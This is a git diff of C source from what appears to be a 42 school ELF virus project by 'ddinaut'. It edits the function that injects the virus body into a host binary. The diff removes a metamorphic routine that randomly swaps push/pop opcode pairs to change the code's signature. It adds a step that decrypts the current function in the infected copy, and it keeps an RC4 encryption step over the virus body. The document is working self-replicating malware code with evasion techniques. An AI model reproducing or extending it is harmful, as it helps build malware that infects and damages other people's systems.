@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/02 18:05:33 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/03 19:38:40 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -27,8 +27,8 @@ void		inject(t_data *data)
 		goto ERR;
 
 	data->context = false;
-	int		size = data->virus.size + data->virus.note->p_offset;
-	uint8_t	*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+	int				size = data->virus.size + data->virus.note->p_offset;
+	uint8_t			*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
 	if (map == MAP_FAILED)
 		goto ERR;
 
@@ -71,40 +71,16 @@ void		inject(t_data *data)
 		dst++;
 	if ((void*)dst >= (void*)data->bin.map + data->bin.size)
 		goto ERR;
-
 	data->bin_entry = data->bin_entry - data->vrs_entry - (data->virus.size - ENTRY_OFF);
 	if (_memcpy(dst + 1, &data->bin_entry, 4) != dst + 1)
 		goto ERR;
 
-	uint16_t inst[INST_ENTRY] =	{
-		0x5850,
-		0x5951,
-		0x5a52,
-		0x5b53,
-		0x5c54,
-		0x5d55,
-		0x5e56,
-		0x5f57
-	};
 
-	// step 5.5 : do simple metamorphic routine
-	lim = (size_t)_rc4 - (size_t)update_one;
-	dst = (map + off) - ((size_t)end_of_data - (size_t)update_one);
-	while (lim--)
-	{
-		for (register int i = 0 ; i < INST_ENTRY ; i++)
-		{
-			if (*(uint16_t*)dst == inst[i])
-			{
-				_memcpy(dst, &inst[_random_number(INST_ENTRY)], 2);
-				dst++;
-				break ;
-			}
-		}
-		dst++;
-	}
+	// step 5.5 : revert current func in infected
+	dst = map + data->virus.note->p_offset + ((size_t)inject - (size_t)start);
+	revert_two(&data->key, (char*)dst, (size_t)release - (size_t)inject);
 
-	// step 6 : Encrypt data
+//	step 6 : Encrypt data
 	dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start));
 	_memcpy(data->cpr_key, (uint8_t*)_rc4, KEY_SIZE);
 	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)opening);
